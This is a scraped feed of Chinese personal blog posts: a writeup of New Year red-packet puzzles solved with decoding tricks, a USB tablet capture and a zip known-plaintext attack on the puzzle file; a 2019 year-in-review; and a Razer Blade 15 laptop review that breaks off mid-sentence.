下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 